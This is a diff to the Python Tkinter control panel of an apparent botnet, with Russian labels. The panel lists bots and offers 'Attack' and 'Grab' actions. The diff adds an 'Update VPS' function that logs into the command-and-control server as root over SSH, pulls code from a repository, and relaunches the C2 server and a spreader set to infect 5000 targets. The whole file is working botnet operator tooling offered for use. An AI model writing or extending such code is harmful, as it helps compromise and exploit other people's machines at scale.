@@ -21,8 +21,6 @@ class BotnetTab(ttk.Frame):
         self.vps_user = "root"
         self.vps_pass = None
         self.spreader_process = None
-        self.spreader_thread = None
-        self.spreader_restart = True
         self.bots = {}
         self._last_fetch_error = 0
         self.my_ip = self._get_my_public_ip()
@@ -66,7 +64,6 @@ class BotnetTab(ttk.Frame):
         self.tree.tag_configure('online', foreground='#007700')
         self.tree.tag_configure('offline', foreground='#cc0000')
 
-        # Контекстное меню
         self.context_menu = tk.Menu(self.tree, tearoff=0)
         self.context_menu.add_command(label="Атака", command=self._ctx_attack)
         self.context_menu.add_command(label="Граб", command=self._ctx_grab)
@@ -102,6 +99,8 @@ class BotnetTab(ttk.Frame):
         self.btn_start_vps.pack(side=tk.LEFT, padx=10)
         self.btn_check_c2 = ttk.Button(f, text="Проверить C2", command=self.check_c2_connection)
         self.btn_check_c2.pack(side=tk.LEFT, padx=10)
+        self.btn_update_vps = ttk.Button(f, text="Обновить VPS", command=self.update_vps)
+        self.btn_update_vps.pack(side=tk.LEFT, padx=10)
 
         self.spread_progress_var = tk.DoubleVar()
         self.spread_progress = ttk.Progressbar(spread_frame, variable=self.spread_progress_var, maximum=100, mode='determinate')
@@ -196,7 +195,6 @@ class BotnetTab(ttk.Frame):
         threading.Thread(target=self._fetch_bots, daemon=True).start()
 
     def check_all_bots(self):
-        """Принудительно обновить список и вывести статус."""
         self.refresh_bots()
         messagebox.showinfo("Проверка", "Запрос отправлен. Статусы обновятся через несколько секунд.")
 
@@ -332,4 +330,32 @@ class BotnetTab(ttk.Frame):
                 client.close()
             except Exception as e:
                 self.spread_log.insert(tk.END, f"[!] Ошибка VPS: {e}\n")
+        threading.Thread(target=run, daemon=True).start()
+
+    # ----- Обновление VPS -----
+    def update_vps(self):
+        if not self.vps_pass:
+            self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
+            if not self.vps_pass:
+                return
+        def run():
+            try:
+                import paramiko
+                self.spread_log.insert(tk.END, "[*] Обновление VPS через GitHub...\n")
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                client.connect(self.c2_host, username=self.vps_user, password=self.vps_pass, timeout=10)
+                # git pull
+                update_cmd = "cd /root/c2 && git pull origin main"
+                stdin, stdout, stderr = client.exec_command(update_cmd)
+                out = stdout.read().decode()
+                err = stderr.read().decode()
+                self.spread_log.insert(tk.END, out + "\n" + err + "\n")
+                # перезапуск C2 и спредера
+                restart_cmd = "cd /root/c2 && pkill -f c2.py; pkill -f spreader.py; nohup python3 c2.py > c2.log 2>&1 & nohup python3 -u spreader.py --count 5000 >> spreader.log 2>&1 &"
+                stdin, stdout, stderr = client.exec_command(restart_cmd)
+                self.spread_log.insert(tk.END, "[+] VPS обновлён и перезапущен\n")
+                client.close()
+            except Exception as e:
+                self.spread_log.insert(tk.END, f"[!] Ошибка обновления VPS: {e}\n")
         threading.Thread(target=run, daemon=True).start()
